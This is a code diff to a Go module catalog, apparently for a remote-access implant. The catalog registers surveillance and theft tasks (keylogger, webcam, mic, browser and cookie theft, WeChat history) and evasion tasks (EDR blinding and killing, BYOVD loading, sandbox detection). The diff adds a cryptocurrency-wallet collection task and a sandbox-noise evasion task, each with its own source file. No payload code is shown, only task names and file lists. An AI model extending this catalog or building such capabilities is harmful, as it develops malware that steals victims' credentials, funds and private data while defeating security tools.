@@ -109,10 +109,11 @@ var agentModuleCatalog = []AgentModule{
 		Description: "clipboard, keylogger, webcam/mic capture and browser/WeChat history theft",
 		Tasks: []string{
 			"clipboard_get", "clipboard_set", "keylogger_start", "keylogger_stop", "keylogger_dump",
-			"webcam", "mic", "browser_history", "browser_steal", "cookie_export", "wechat_history",
+			"webcam", "mic", "browser_history", "browser_steal", "wallet_collect", "cookie_export", "wechat_history",
 		},
 		RegistryFiles: []string{"task_registry_collection.go"},
 		ExclusiveFiles: []string{
+			"task_wallet.go",
 			"agent_webcam.go",
 			"browser_history.go",
 			"wechat_history.go",
@@ -206,10 +207,11 @@ var agentModuleCatalog = []AgentModule{
 			"set_sleep_mask", "set_sleep_mask_advanced", "run_evasion",
 			"kernel_callback", "etwti", "enum_callbacks", "objcb", "imgload",
 			"edr_blind", "edr_kill", "byovd_load", "ppl_check",
-			"ghost_mode_status", "ghost_mode_exit", "sandbox_detect", "sandbox_detect_advanced",
+			"ghost_mode_status", "ghost_mode_exit", "sandbox_detect", "sandbox_detect_advanced", "sandbox_noise",
 		},
 		RegistryFiles: []string{"task_registry_evasion.go"},
 		ExclusiveFiles: []string{
+			"task_sandbox_noise.go",
 			"evasion_enum_callbacks_windows.go",
 			"evasion_etwti_windows.go",
 			"evasion_kernel_callback_windows.go",
